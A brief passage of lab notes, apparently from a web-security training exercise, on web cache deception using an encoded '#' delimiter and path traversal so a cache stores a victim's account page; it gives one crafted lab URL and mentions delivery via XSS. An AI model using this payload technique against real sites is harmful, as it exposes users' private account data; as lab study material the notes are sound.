# Using caching agent normalization to do web cache deception

In a similar manner, letâ€™s craft an exploit and deliver it via XSS:

NOTE! For this attack to work, a delimiter that is processed by an origin server and not processed by caching agent is needed. In this example, `%23` is such delimiter discovered using fuzzing

```jsx
https://0a9800c503a69dfb80218ff200910032.web-security-academy.net/my-account%23%2f..%2fresources
```

```jsx

```

After exploit delivery:
